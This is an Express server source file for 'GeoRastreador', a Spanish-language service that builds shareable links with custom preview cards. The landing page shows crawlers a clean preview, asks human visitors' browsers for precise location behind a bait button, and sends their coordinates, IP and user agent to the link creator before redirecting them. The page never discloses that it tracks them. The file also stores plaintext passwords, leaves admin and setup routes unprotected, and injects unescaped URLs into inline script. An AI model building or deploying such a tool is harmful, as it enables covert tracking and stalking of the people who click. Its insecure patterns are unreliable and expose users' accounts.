const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const dotenv = require('dotenv');

// Load environment variables
dotenv.config();

const app = express();
const SECRET_KEY = process.env.JWT_SECRET || 'super-secret-key-change-in-prod';

// Global error catcher for the loading phase
let startupError = null;
let models = null;

try {
    // Attempt to load models
    models = require('./models');
} catch (e) {
    console.error('CRITICAL STARTUP ERROR (Models):', e);
    startupError = e;
}

// Middleware
app.use(cors({
    origin: true, // Allow all for debugging, adjust in prod
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
}));
app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());

// Root Route (Welcome)
app.get('/', (req, res) => {
    res.json({
        message: 'Ubicar API Server is running',
        status: 'online',
        endpoints: {
            health: '/api/health',
            debug: '/api/debug-env'
        }
    });
});

// --- ROUTES ---

// Helper: Escape special characters for HTML
const escapeHtml = (text) => {
    if (!text) return '';
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
};

// Helper: Detect social media bots via User-Agent
const isSocialBot = (userAgent) => {
    return /facebookexternalhit|Facebot|WhatsApp|TelegramBot|TwitterBot|LinkedInBot|Slackbot|Discordbot|Googlebot/i.test(userAgent || '');
};

// Helper: Generate OG meta tags HTML
const generateOgHtml = (title, description, image, fullUrl) => {
    const safeTitle = escapeHtml(title);
    const safeDescription = escapeHtml(description);
    return `
    <meta property="og:site_name" content="GeoRastreador">
    <meta property="og:type" content="website">
    <meta property="og:url" content="${fullUrl}">
    <meta property="og:title" content="${safeTitle}">
    <meta property="og:description" content="${safeDescription}">
    <meta property="og:image" content="${image}">
    <meta property="og:image:secure_url" content="${image}">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="${safeTitle}">
    <meta name="twitter:description" content="${safeDescription}">
    <meta name="twitter:image" content="${image}">`;
};

// Helper: Validate image URL for OG tags (must be a public https/http URL, not base64)
const isValidOgImageUrl = (url) => {
    if (!url) return false;
    return url.startsWith('http://') || url.startsWith('https://');
};

// Helper: Fetch link metadata from database
const fetchLinkMeta = async (id) => {
    let title = 'GeoRastreador';
    let description = 'Comparte tu ubicación en tiempo real.';
    const defaultImage = 'https://cdn-icons-png.flaticon.com/512/854/854878.png';
    let image = defaultImage;
    try {
        if (models && models.Link) {
            const link = await models.Link.findByPk(id);
            if (link) {
                title = link.title || title;
                description = link.description || description;
                // Only use imageUrl if it's a valid public URL (not base64/data URIs)
                image = isValidOgImageUrl(link.imageUrl) ? link.imageUrl : defaultImage;
            }
        }
    } catch (e) {
        console.error('Share Route Error:', e);
    }
    return { title, description, image };
};

// Helper: Fetch full link data including destination URL
const fetchLinkData = async (id) => {
    let title = 'GeoRastreador';
    let description = 'Comparte tu ubicación en tiempo real.';
    const defaultImage = 'https://cdn-icons-png.flaticon.com/512/854/854878.png';
    let image = defaultImage;
    let destinationUrl = '#';
    let buttonText = 'Más información';
    
    try {
        if (models && models.Link) {
            const link = await models.Link.findByPk(id);
            if (link) {
                console.log('Link found:', link.id, 'Raw imageUrl:', link.imageUrl);
                title = link.title || title;
                description = link.description || description;
                
                // Validate image URL - must be a public http/https URL, not base64
                const imgUrl = link.imageUrl ? link.imageUrl.trim() : '';
                if (imgUrl && imgUrl.startsWith('http') && !imgUrl.startsWith('data:')) {
                    image = imgUrl;
                    console.log('✅ Using valid public image URL:', image);
                } else if (imgUrl && imgUrl.startsWith('data:')) {
                    console.log('❌ Image is base64, using default. Image must be a public URL (https://...)');
                    image = defaultImage;
                } else if (imgUrl) {
                    console.log('❌ Invalid image URL format:', imgUrl);
                    image = defaultImage;
                } else {
                    console.log('ℹ️ No image configured, using default');
                }
                
                destinationUrl = link.destinationUrl || '#';
                buttonText = link.buttonText || 'Más información';
            } else {
                console.log('Link not found:', id);
            }
        }
    } catch (e) {
        console.error('Fetch Link Error:', e);
    }
    return { title, description, image, destinationUrl, buttonText };
};

// Landing Page Route - /s/:id shows the preview card
app.get('/s/:id', async (req, res) => {
    const { title, description, image, destinationUrl, buttonText } = await fetchLinkData(req.params.id);
    const fullUrl = `${req.protocol}://${req.get('host')}/s/${req.params.id}`;
    const trackUrl = `/track/${req.params.id}`;
    const isBot = isSocialBot(req.headers['user-agent'] || '');
    const safeTitle = escapeHtml(title);
    const safeDescription = escapeHtml(description);
    const safeButtonText = escapeHtml(buttonText);
    const ogTags = generateOgHtml(title, description, image, fullUrl);

    // For bots: minimal HTML with meta tags
    if (isBot) {
        return res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>${safeTitle}</title>
    <meta name="description" content="${safeDescription}">
    ${ogTags}
</head>
<body><h1>${safeTitle}</h1><p>${safeDescription}</p></body>
</html>`);
    }

    // For users: Landing page with image, title, description and CTA button
    res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${safeTitle}</title>
    <meta name="description" content="${safeDescription}">
    ${ogTags}
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #1e3a5f 0%, #0f172a 100%); 
            color: white; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            padding: 20px; 
        }
        .card { 
            max-width: 480px; 
            width: 100%; 
            background: #1e293b; 
            border-radius: 20px; 
            overflow: hidden; 
            box-shadow: 0 25px 80px rgba(0,0,0,0.5); 
        }
        .card-img { 
            width: 100%; 
            height: 280px; 
            object-fit: cover; 
            display: block; 
        }
        .card-img-placeholder { 
            width: 100%; 
            height: 280px; 
            background: linear-gradient(135deg, #334155, #1e293b); 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            color: #64748b; 
            font-size: 64px; 
        }
        .card-body { padding: 28px; }
        h1 { font-size: 24px; font-weight: 700; margin-bottom: 12px; line-height: 1.3; }
        .desc { color: #94a3b8; font-size: 15px; line-height: 1.6; margin-bottom: 24px; }
        .btn { 
            display: block; 
            width: 100%; 
            text-align: center; 
            background: #3b82f6; 
            color: white; 
            padding: 16px 24px; 
            border-radius: 12px; 
            text-decoration: none; 
            font-weight: 600; 
            font-size: 16px; 
            border: none;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s; 
        }
        .btn:hover { background: #2563eb; transform: translateY(-2px); }
        .btn:active { transform: translateY(0); }
        .btn:disabled { background: #475569; cursor: not-allowed; transform: none; }
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-left: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .error-msg {
            background: rgba(239, 68, 68, 0.1);
            color: #f87171;
            padding: 12px;
            border-radius: 8px;
            margin-top: 16px;
            font-size: 13px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="card">
        ${image ? `<img class="card-img" src="${image}" alt="${safeTitle}" onerror="this.parentElement.querySelector('.card-img-placeholder').style.display='flex'; this.style.display='none';">
        <div class="card-img-placeholder" style="display:none;">&#127744;</div>` : '<div class="card-img-placeholder">&#127744;</div>'}
        <div class="card-body">
            <h1>${safeTitle}</h1>
            <p class="desc">${safeDescription}</p>
            <button id="ctaBtn" class="btn">${safeButtonText}</button>
            <div id="errorMsg" class="error-msg"></div>
        </div>
    </div>
    
    <script>
        // Check if user already subscribed (gave location before)
        const linkId = '${req.params.id}';
        const storageKey = 'ubicar_subscribed_' + linkId;
        const alreadySubscribed = localStorage.getItem(storageKey);
        
        if (alreadySubscribed) {
            // Already subscribed, redirect immediately to destination
            console.log('Already subscribed, redirecting...');
            window.location.replace('${destinationUrl}');
        }
        
        document.getElementById('ctaBtn').addEventListener('click', async function() {
            const btn = this;
            const errorMsg = document.getElementById('errorMsg');
            
            btn.disabled = true;
            btn.innerHTML = 'Obteniendo ubicación... <span class="spinner"></span>';
            errorMsg.style.display = 'none';
            
            // Try to get location
            if (!navigator.geolocation) {
                // No geolocation support, mark as subscribed and redirect
                localStorage.setItem(storageKey, 'true');
                window.location.href = '${destinationUrl}';
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    // Got location, send to server
                    try {
                        await fetch('${trackUrl}', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                lat: position.coords.latitude,
                                lng: position.coords.longitude,
                                userAgent: navigator.userAgent
                            })
                        });
                    } catch (e) {
                        console.log('Tracking error:', e);
                    }
                    // Mark as subscribed and redirect to destination
                    localStorage.setItem(storageKey, 'true');
                    window.location.href = '${destinationUrl}';
                },
                (error) => {
                    // Location denied or error, mark as subscribed anyway and redirect
                    console.log('Location error:', error);
                    localStorage.setItem(storageKey, 'true');
                    window.location.href = '${destinationUrl}';
                },
                { timeout: 10000, enableHighAccuracy: true }
            );
        });
    </script>
</body>
</html>`);
});

// Track location from landing page
app.post('/track/:id', async (req, res) => {
    try {
        const { lat, lng, userAgent } = req.body;
        const linkId = req.params.id;
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        
        console.log('Tracking location for link:', linkId, 'Lat:', lat, 'Lng:', lng);
        
        if (models && models.Session) {
            await models.Session.create({
                linkId,
                lat,
                lng,
                userAgent: userAgent || req.headers['user-agent'],
                ip,
                timestamp: new Date()
            });
            console.log('Location saved successfully');
        }
        
        res.json({ success: true });
    } catch (error) {
        console.error('Track error:', error);
        res.status(500).json({ error: 'Tracking failed' });
    }
});

// Simple Ping
app.get('/api/ping', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        node: process.version,
        env: process.env.NODE_ENV
    });
});

// Database Schema Sync (creates/alters all tables to match models)
app.get('/api/setup-db', async (req, res) => {
    try {
        if (!models || !models.sequelize) throw new Error('Database models not initialized (Check server logs)');
        const results = [];

        // Add trackingActive column to Links if missing
        try {
            await models.sequelize.query('ALTER TABLE "Links" ADD COLUMN IF NOT EXISTS "trackingActive" BOOLEAN DEFAULT true;');
            results.push('Links.trackingActive: OK');
        } catch (e) { results.push('Links.trackingActive: ' + e.message); }

        // Add active column to Sessions if missing
        try {
            await models.sequelize.query('ALTER TABLE "Sessions" ADD COLUMN IF NOT EXISTS "active" BOOLEAN DEFAULT true;');
            results.push('Sessions.active: OK');
        } catch (e) { results.push('Sessions.active: ' + e.message); }

        // Create LocationHistories table if not exists
        try {
            await models.sequelize.query(`
                CREATE TABLE IF NOT EXISTS "LocationHistories" (
                    "id" UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                    "linkId" VARCHAR(255) NOT NULL,
                    "lat" FLOAT NOT NULL,
                    "lng" FLOAT NOT NULL,
                    "timestamp" TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
                    "ip" VARCHAR(255),
                    "userAgent" VARCHAR(255),
                    "createdAt" TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
                    "updatedAt" TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
                );
            `);
            results.push('LocationHistories table: OK');
        } catch (e) { results.push('LocationHistories table: ' + e.message); }

        res.json({ message: 'Database setup complete', results });
    } catch (error) {
        console.error('Setup DB Error:', error);
        res.status(200).json({ error: error.message });
    }
});

// Migrate base64 images to public URLs
app.get('/api/migrate-images', async (req, res) => {
    try {
        const links = await models.Link.findAll();
        const results = [];
        for (const link of links) {
            if (link.imageUrl && link.imageUrl.startsWith('data:image/')) {
                try {
                    const publicUrl = await uploadBase64ToImgBB(link.imageUrl);
                    await link.update({ imageUrl: publicUrl });
                    results.push({ id: link.id, status: 'converted', url: publicUrl });
                } catch (e) {
                    results.push({ id: link.id, status: 'failed', error: e.message });
                }
            } else {
                results.push({ id: link.id, status: 'skipped', reason: 'already public URL or empty' });
            }
        }
        res.json({ message: 'Migration complete', results });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Deep Debug Route
app.get('/api/debug-env', async (req, res) => {
    const dbStatus = models && models.sequelize ? 'initialized' : 'failed/missing';
    let dbConnection = 'untested';

    if (models && models.sequelize) {
        try {
            await models.sequelize.authenticate();
            dbConnection = 'connected';
        } catch (e) {
            dbConnection = 'failed: ' + e.message;
        }
    }

    res.json({
        startupError: startupError ? { message: startupError.message, stack: startupError.stack } : null,
        database: {
            status: dbStatus,
            connection: dbConnection,
            url_present: !!process.env.DATABASE_URL
        },
        environment: {
            NODE_ENV: process.env.NODE_ENV,
            PORT: process.env.PORT
        },
        modules: {
            express: !!require('express'),
            sequelize: !!require('sequelize')
        }
    });
});

// Health Check
app.get('/api/health', async (req, res) => {
    try {
        if (!models || !models.sequelize) throw new Error('Models not loaded');
        await models.sequelize.authenticate();
        res.json({ status: 'online', database: 'connected' });
    } catch (error) {
        res.status(500).json({ status: 'error', error: error.message });
    }
});

// --- AUTH ---
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    console.log(`Login attempt: ${email}`);

    try {
        if (startupError) {
            return res.status(500).json({
                message: 'Servidor en estado de error de inicio',
                details: startupError.message
            });
        }

        if (!models || !models.User) {
            return res.status(500).json({
                message: 'Base de datos no disponible',
                hint: 'Revisa /api/debug-env para más detalles'
            });
        }

        const user = await models.User.findOne({ where: { email } });
        if (user && user.password === password) {
            if (!user.isActive) {
                return res.status(403).json({ message: 'Cuenta desactivada' });
            }
            const token = jwt.sign(
                { id: user.id, email: user.email, role: user.role },
                SECRET_KEY,
                { expiresIn: '24h' }
            );
            res.json({ token, role: user.role });
        } else {
            res.status(401).json({ message: 'Email o contraseña incorrectos' });
        }
    } catch (error) {
        console.error('LOGIN ERROR:', error);
        res.status(500).json({
            message: 'Error interno en el servidor',
            details: error.message
        });
    }
});

// Auth Middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.sendStatus(401);

    jwt.verify(token, SECRET_KEY, (err, user) => {
        if (err) return res.sendStatus(403);
        req.user = user;
        next();
    });
};

// --- LINK & USER ROUTES (Restored) ---

// Helper: Upload base64 image to ImgBB and return public URL
const uploadBase64ToImgBB = async (base64Data) => {
    const cleanBase64 = base64Data.replace(/^data:image\/\w+;base64,/, '');
    const IMGBB_API_KEY = process.env.IMGBB_API_KEY;
    if (!IMGBB_API_KEY) {
        throw new Error('IMGBB_API_KEY not configured. Get a free key at https://api.imgbb.com/');
    }
    const https = require('https');
    const formBody = `key=${IMGBB_API_KEY}&image=${encodeURIComponent(cleanBase64)}`;

    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'api.imgbb.com',
            path: '/1/upload',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(formBody)
            }
        };
        const request = https.request(options, (response) => {
            let data = '';
            response.on('data', chunk => data += chunk);
            response.on('end', () => {
                try {
                    const result = JSON.parse(data);
                    if (result.success) {
                        resolve(result.data.display_url || result.data.url);
                    } else {
                        console.error('ImgBB error response:', JSON.stringify(result));
                        reject(new Error('ImgBB upload failed: ' + JSON.stringify(result.error || result)));
                    }
                } catch (e) {
                    console.error('ImgBB raw response:', data.substring(0, 500));
                    reject(new Error('Failed to parse ImgBB response: ' + data.substring(0, 200)));
                }
            });
        });
        request.on('error', reject);
        request.write(formBody);
        request.end();
    });
};

// Helper: If imageUrl is base64, upload to ImgBB. If it's a URL, keep as-is.
const ensurePublicImageUrl = async (imageUrl) => {
    if (!imageUrl) return imageUrl;
    if (imageUrl.startsWith('http://') || imageUrl.startsWith('https://')) return imageUrl;
    if (imageUrl.startsWith('data:image/')) {
        try {
            return await uploadBase64ToImgBB(imageUrl);
        } catch (e) {
            console.error('Auto-upload failed:', e.message);
            return null; // Will use default fallback
        }
    }
    return imageUrl;
};

// Create Link
app.post('/api/links', authenticateToken, async (req, res) => {
    let { title, description, imageUrl, destinationUrl, buttonText } = req.body;
    try {
        // Auto-convert base64 images to public URLs
        imageUrl = await ensurePublicImageUrl(imageUrl);

        const newLink = await models.Link.create({
            id: Math.random().toString(36).substr(2, 9),
            title, description, imageUrl, destinationUrl, buttonText,
            createdBy: req.user.id
        });
        res.json(newLink);
    } catch (error) {
        res.status(500).json({ message: 'Error creando enlace: ' + error.message });
    }
});

// Get Link Public
app.get('/api/links/:id', async (req, res) => {
    try {
        const link = await models.Link.findByPk(req.params.id);
        if (link) res.json(link);
        else res.status(404).json({ message: 'Enlace no encontrado' });
    } catch (error) {
        res.status(500).json({ message: 'Error recuperando enlace' });
    }
});

// Update Link
app.put('/api/links/:id', authenticateToken, async (req, res) => {
    let { title, description, imageUrl, destinationUrl, buttonText } = req.body;
    try {
        const link = await models.Link.findByPk(req.params.id);
        if (!link) return res.status(404).json({ message: 'Enlace no encontrado' });

        if (link.createdBy !== req.user.id && req.user.role !== 'admin') {
            return res.status(403).json({ message: 'No tienes permiso' });
        }

        // Auto-convert base64 images to public URLs
        imageUrl = await ensurePublicImageUrl(imageUrl);

        await link.update({ title, description, imageUrl, destinationUrl, buttonText });
        res.json(link);
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Delete Link
app.delete('/api/links/:id', authenticateToken, async (req, res) => {
    try {
        const link = await models.Link.findByPk(req.params.id);
        if (!link) return res.status(404).json({ message: 'Enlace no encontrado' });

        if (link.createdBy !== req.user.id && req.user.role !== 'admin') {
            return res.status(403).json({ message: 'No tienes permiso' });
        }

        await link.destroy();
        res.json({ message: 'Enlace eliminado' });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// User Stats
app.get('/api/user/stats', authenticateToken, async (req, res) => {
    try {
        const linksCount = await models.Link.count({ where: { createdBy: req.user.id } });
        const sessionsCount = await models.Session.count({
            include: [{ model: models.Link, where: { createdBy: req.user.id } }]
        });
        res.json({ totalLinks: linksCount, totalLocations: sessionsCount });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// User Links
app.get('/api/user/links', authenticateToken, async (req, res) => {
    try {
        const links = await models.Link.findAll({
            where: { createdBy: req.user.id },
            order: [['createdAt', 'DESC']]
        });
        res.json(links);
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Admin Links
app.get('/api/admin/links', authenticateToken, async (req, res) => {
    try {
        const links = await models.Link.findAll({ include: models.User });
        res.json(links);
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Admin Middleware - Check if user is admin
const requireAdmin = (req, res, next) => {
    if (req.user.role !== 'admin') {
        return res.status(403).json({ message: 'Acceso denegado. Se requieren permisos de administrador.' });
    }
    next();
};

// --- ADMIN USER MANAGEMENT ROUTES ---

// Get all users (Admin only)
app.get('/api/admin/users', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const users = await models.User.findAll({
            attributes: { exclude: ['password'] },
            order: [['createdAt', 'DESC']]
        });
        res.json(users);
    } catch (error) {
        console.error('Error fetching users:', error);
        res.status(500).json({ message: 'Error obteniendo usuarios: ' + error.message });
    }
});

// Get single user (Admin only)
app.get('/api/admin/users/:id', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const user = await models.User.findByPk(req.params.id, {
            attributes: { exclude: ['password'] }
        });
        if (!user) {
            return res.status(404).json({ message: 'Usuario no encontrado' });
        }
        res.json(user);
    } catch (error) {
        console.error('Error fetching user:', error);
        res.status(500).json({ message: 'Error obteniendo usuario: ' + error.message });
    }
});

// Create new user (Admin only)
app.post('/api/admin/users', authenticateToken, requireAdmin, async (req, res) => {
    const { email, password, role, isActive, address, city, phone } = req.body;
    
    try {
        // Check if email already exists
        const existingUser = await models.User.findOne({ where: { email } });
        if (existingUser) {
            return res.status(400).json({ message: 'El email ya está registrado' });
        }

        // Validate required fields
        if (!email || !password) {
            return res.status(400).json({ message: 'Email y contraseña son requeridos' });
        }

        // Create user
        const newUser = await models.User.create({
            email,
            password, // Note: In production, hash this!
            role: role || 'user',
            isActive: isActive !== undefined ? isActive : true,
            address,
            city,
            phone
        });

        const userResponse = newUser.toJSON();
        delete userResponse.password;

        res.status(201).json(userResponse);
    } catch (error) {
        console.error('Error creating user:', error);
        res.status(500).json({ message: 'Error creando usuario: ' + error.message });
    }
});

// Update user (Admin only)
app.put('/api/admin/users/:id', authenticateToken, requireAdmin, async (req, res) => {
    const { email, password, role, isActive, address, city, phone, avatarUrl } = req.body;
    
    try {
        const user = await models.User.findByPk(req.params.id);
        if (!user) {
            return res.status(404).json({ message: 'Usuario no encontrado' });
        }

        // Check if email is being changed and if it's already taken
        if (email && email !== user.email) {
            const existingUser = await models.User.findOne({ where: { email } });
            if (existingUser) {
                return res.status(400).json({ message: 'El email ya está registrado' });
            }
        }

        // Build updates object
        const updates = {};
        if (email !== undefined) updates.email = email;
        if (password !== undefined && password.trim() !== '') updates.password = password; // Note: In production, hash this!
        if (role !== undefined) updates.role = role;
        if (isActive !== undefined) updates.isActive = isActive;
        if (address !== undefined) updates.address = address;
        if (city !== undefined) updates.city = city;
        if (phone !== undefined) updates.phone = phone;
        if (avatarUrl !== undefined) updates.avatarUrl = avatarUrl;

        await user.update(updates);

        const userResponse = user.toJSON();
        delete userResponse.password;

        res.json(userResponse);
    } catch (error) {
        console.error('Error updating user:', error);
        res.status(500).json({ message: 'Error actualizando usuario: ' + error.message });
    }
});

// Toggle user active status (Admin only)
app.patch('/api/admin/users/:id/toggle-status', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const user = await models.User.findByPk(req.params.id);
        if (!user) {
            return res.status(404).json({ message: 'Usuario no encontrado' });
        }

        // Prevent deactivating yourself
        if (user.id === req.user.id) {
            return res.status(400).json({ message: 'No puedes desactivar tu propia cuenta' });
        }

        await user.update({ isActive: !user.isActive });

        const userResponse = user.toJSON();
        delete userResponse.password;

        res.json({ 
            message: `Usuario ${user.isActive ? 'activado' : 'desactivado'} exitosamente`,
            user: userResponse 
        });
    } catch (error) {
        console.error('Error toggling user status:', error);
        res.status(500).json({ message: 'Error cambiando estado del usuario: ' + error.message });
    }
});

// Delete user (Admin only)
app.delete('/api/admin/users/:id', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const user = await models.User.findByPk(req.params.id);
        if (!user) {
            return res.status(404).json({ message: 'Usuario no encontrado' });
        }

        // Prevent deleting yourself
        if (user.id === req.user.id) {
            return res.status(400).json({ message: 'No puedes eliminar tu propia cuenta' });
        }

        await user.destroy();
        res.json({ message: 'Usuario eliminado exitosamente' });
    } catch (error) {
        console.error('Error deleting user:', error);
        res.status(500).json({ message: 'Error eliminando usuario: ' + error.message });
    }
});

// User Sessions
app.get('/api/user/sessions', authenticateToken, async (req, res) => {
    try {
        const sessions = await models.Session.findAll({
            where: { active: true },
            include: [{ model: models.Link, where: { createdBy: req.user.id } }],
            order: [['timestamp', 'DESC']]
        });
        res.json(sessions);
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Clear User Sessions (Clean Map)
app.delete('/api/user/sessions', authenticateToken, async (req, res) => {
    try {
        const links = await models.Link.findAll({ where: { createdBy: req.user.id } });
        const linkIds = links.map(l => l.id);

        if (linkIds.length > 0) {
            await models.Session.update({ active: false }, { where: { linkId: linkIds } });
        }
        res.json({ message: 'History cleared' });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Clear Specific Link History
app.delete('/api/links/:id/sessions', authenticateToken, async (req, res) => {
    try {
        const link = await models.Link.findByPk(req.params.id);
        if (!link) return res.status(404).json({ message: 'Enlace no encontrado' });

        if (link.createdBy !== req.user.id && req.user.role !== 'admin') {
            return res.status(403).json({ message: 'No tienes permiso' });
        }

        await models.Session.destroy({ where: { linkId: link.id } });
        res.json({ message: 'Link history cleared' });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Get User Profile
app.get('/api/user/profile', authenticateToken, async (req, res) => {
    try {
        const user = await models.User.findByPk(req.user.id, {
            attributes: { exclude: ['password'] }
        });
        if (!user) return res.status(404).json({ message: 'Usuario no encontrado' });
        res.json(user);
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Update User Profile
app.put('/api/user/profile', authenticateToken, async (req, res) => {
    const { password, avatarUrl, address, city, phone } = req.body;
    try {
        const user = await models.User.findByPk(req.user.id);
        if (!user) return res.status(404).json({ message: 'Usuario no encontrado' });

        const updates = { avatarUrl, address, city, phone };
        if (password && password.trim() !== '') {
            updates.password = password; // Note: In production, hash this!
        }

        await user.update(updates);

        const updatedUser = user.toJSON();
        delete updatedUser.password;

        res.json(updatedUser);
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Upload Image (converts base64 to public URL via ImgBB)
app.post('/api/upload-image', authenticateToken, async (req, res) => {
    try {
        const { image } = req.body;
        if (!image) return res.status(400).json({ message: 'No image provided' });

        const publicUrl = await uploadBase64ToImgBB(image);
        res.json({ url: publicUrl, display_url: publicUrl });
    } catch (error) {
        console.error('Image Upload Error:', error);
        res.status(500).json({ message: 'Error uploading image: ' + error.message });
    }
});

// Toggle Tracking Active/Paused (Authenticated)
app.put('/api/links/:id/tracking', authenticateToken, async (req, res) => {
    try {
        const link = await models.Link.findByPk(req.params.id);
        if (!link) return res.status(404).json({ message: 'Enlace no encontrado' });

        if (link.createdBy !== req.user.id && req.user.role !== 'admin') {
            return res.status(403).json({ message: 'No tienes permiso' });
        }

        const newState = !link.trackingActive;
        await link.update({ trackingActive: newState });
        res.json({ trackingActive: newState });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Get Tracking Status (Public - polled by tracked client)
app.get('/api/links/:id/tracking-status', async (req, res) => {
    try {
        const link = await models.Link.findByPk(req.params.id, {
            attributes: ['id', 'trackingActive']
        });
        if (!link) return res.status(404).json({ active: false });
        res.json({ active: link.trackingActive !== false });
    } catch (error) {
        res.json({ active: true }); // Default to active on error
    }
});

// Get Location History for a link (with date filtering)
app.get('/api/links/:id/history', authenticateToken, async (req, res) => {
    try {
        const link = await models.Link.findByPk(req.params.id);
        if (!link) return res.status(404).json({ message: 'Enlace no encontrado' });

        if (link.createdBy !== req.user.id && req.user.role !== 'admin') {
            return res.status(403).json({ message: 'No tienes permiso' });
        }

        const { Op } = require('sequelize');
        const where = { linkId: req.params.id };

        // Date filtering
        if (req.query.from || req.query.to) {
            where.timestamp = {};
            if (req.query.from) where.timestamp[Op.gte] = new Date(req.query.from);
            if (req.query.to) where.timestamp[Op.lte] = new Date(req.query.to);
        }

        const history = await models.LocationHistory.findAll({
            where,
            order: [['timestamp', 'ASC']],
            attributes: ['id', 'lat', 'lng', 'timestamp', 'ip', 'userAgent'],
            limit: 5000 // Safety limit
        });

        res.json(history);
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Get available dates with location data for a link
app.get('/api/links/:id/history/dates', authenticateToken, async (req, res) => {
    try {
        const link = await models.Link.findByPk(req.params.id);
        if (!link) return res.status(404).json({ message: 'Enlace no encontrado' });

        if (link.createdBy !== req.user.id && req.user.role !== 'admin') {
            return res.status(403).json({ message: 'No tienes permiso' });
        }

        const [results] = await models.sequelize.query(
            `SELECT DISTINCT DATE("timestamp") as date, COUNT(*) as count
             FROM "LocationHistories"
             WHERE "linkId" = :linkId
             GROUP BY DATE("timestamp")
             ORDER BY date DESC`,
            { replacements: { linkId: req.params.id } }
        );

        res.json(results);
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// Track Visit (HTTP)
app.post('/api/track', async (req, res) => {
    const { linkId, lat, lng, userAgent } = req.body;
    try {
        if (!models || !models.Session) throw new Error('Models not loaded');

        // Check if tracking is active for this link
        if (models.Link) {
            const link = await models.Link.findByPk(linkId, { attributes: ['id', 'trackingActive'] });
            if (link && link.trackingActive === false) {
                return res.json({ message: 'Tracking paused', paused: true });
            }
        }

        // Capture IP (Vercel/Proxy friendly)
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        const timestamp = new Date();

        await models.Session.create({
            linkId,
            lat,
            lng,
            userAgent,
            ip,
            timestamp
        });

        // Also save to location history for permanent route tracking
        if (models.LocationHistory) {
            await models.LocationHistory.create({
                linkId, lat, lng, userAgent, ip, timestamp
            });
        }

        console.log(`Tracking saved for link ${linkId} from IP ${ip}`);
        res.json({ message: 'Tracking saved' });
    } catch (error) {
        console.error('Tracking Error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Global Handler
app.use((err, req, res, next) => {
    console.error('UNHANDLED ERROR:', err);
    res.status(500).json({ error: 'Fallo catastrófico', message: err.message });
});

module.exports = app;
